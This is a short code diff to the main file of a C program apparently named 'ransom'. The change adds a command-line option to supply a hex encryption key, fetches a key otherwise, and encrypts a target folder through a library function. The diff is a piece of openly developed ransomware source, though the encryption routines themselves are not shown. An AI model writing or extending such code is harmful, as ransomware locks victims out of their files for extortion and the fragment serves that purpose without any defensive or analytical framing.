@@ -3,28 +3,26 @@
 #include <string.h>
 #include "src/libcom.h"
 
-void test(int my_variable) {
-	for(int i = 0; i < my_variable; i++) {
-		printf("-> %d\n", my_variable);
-	}
-}
-
 void usage() {
-	printf("Usage : ./ransom <file>\n");
+	printf("Usage : ./ransom <file> <key in hex if decrypt>\n");
 }
 
 int main (int argc, char **argv){
-	if (argc != 2) {
+	// if less than one argument then show usage and exit
+	if (argc < 2) {
 		usage();
 		return 0;
 	}
 	int ID = 0;
+	// if two args then the key equ that second arg
+	char* key = 0;
 	if(argc == 3){
-		ID = atoi(argv[2]);
+		key = malloc(LENGTH);
+		char *hex_key = argv[2];
+		hexa_to_bytes(hex_key, (unsigned char*)key, LENGTH);
 	}
-	// get the key
-	char* key;
-	key = getKey(ID);
+	else
+		key = getKey(ID);
 	// encrypt the folder
 	encDir(argv[1], key);
 	free(key);
